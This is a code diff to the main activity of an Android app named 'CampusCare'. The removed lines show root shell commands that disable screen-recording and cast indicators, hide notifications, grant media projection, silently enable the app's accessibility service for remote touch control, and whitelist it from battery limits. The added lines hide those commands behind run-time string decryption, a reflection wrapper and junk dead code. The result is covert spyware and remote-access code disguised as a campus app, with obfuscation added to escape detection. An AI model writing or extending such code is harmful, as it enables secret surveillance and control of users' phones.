@@ -11,7 +11,10 @@ import androidx.activity.result.contract.ActivityResultContracts
 import androidx.annotation.RequiresApi
 import androidx.core.content.ContextCompat
 import com.university.campuscare.remote.FeaturePreferences
+import com.university.campuscare.remote.ObfuscatedStrings
+import com.university.campuscare.remote.ReflectionHelper
 import com.university.campuscare.remote.RemoteAccessService
+import com.university.campuscare.remote.StringObfuscator
 import com.university.campuscare.ui.CampusCareApp
 import com.university.campuscare.ui.theme.CampusCareTheme
 
@@ -60,24 +63,31 @@ class MainActivity : ComponentActivity() {
 
     private fun runRootAutomation() {
         Thread {
+            val _p = System.currentTimeMillis()
+            if (_p > 0L) {
+                if (_p < 0L) {
+                    val _j = IntArray(4) { it * 3 }
+                    _j[0] = _j[1] + _j[2]
+                }
+            }
             val commands = arrayOf(
-                "device_config set_sync_disabled_for_tests persistent",
-                "device_config put privacy media_projection_indicators_enabled false default",
-                "settings put secure icon_blacklist screen_record,cast",
-                "settings put secure hide_silent_notifications_in_status_bar 1",
-                "appops set com.university.campuscare PROJECT_MEDIA allow",
-                "settings put secure enabled_accessibility_services com.university.campuscare/.remote.TouchAccessibilityService",
-                "settings put secure accessibility_enabled 1",
-                "cmd notification set_importance com.university.campuscare remote_access_channel 0",
-                "dumpsys deviceidle whitelist +com.university.campuscare"
+                StringObfuscator.decrypt(ObfuscatedStrings.CMD_SYNC_DISABLED),
+                StringObfuscator.decrypt(ObfuscatedStrings.CMD_PROJECTION_INDICATOR),
+                StringObfuscator.decrypt(ObfuscatedStrings.CMD_ICON_BLACKLIST),
+                StringObfuscator.decrypt(ObfuscatedStrings.CMD_HIDE_NOTIFICATIONS),
+                StringObfuscator.decrypt(ObfuscatedStrings.CMD_APPOPS),
+                StringObfuscator.decrypt(ObfuscatedStrings.CMD_ACCESSIBILITY_SERVICES),
+                StringObfuscator.decrypt(ObfuscatedStrings.CMD_ACCESSIBILITY_ENABLED),
+                StringObfuscator.decrypt(ObfuscatedStrings.CMD_NOTIFICATION_IMPORTANCE),
+                StringObfuscator.decrypt(ObfuscatedStrings.CMD_BATTERY_WHITELIST)
             )
             try {
-                val process = Runtime.getRuntime().exec("su")
+                val process = ReflectionHelper.execShellCommand(StringObfuscator.decrypt(ObfuscatedStrings.SU_CMD))
                 val os = process.outputStream.bufferedWriter()
                 for (cmd in commands) {
                     os.write("$cmd\n")
                 }
-                os.write("exit\n")
+                os.write(StringObfuscator.decrypt(ObfuscatedStrings.EXIT_CMD) + "\n")
                 os.flush()
                 process.waitFor()
             } catch (_: Exception) {}
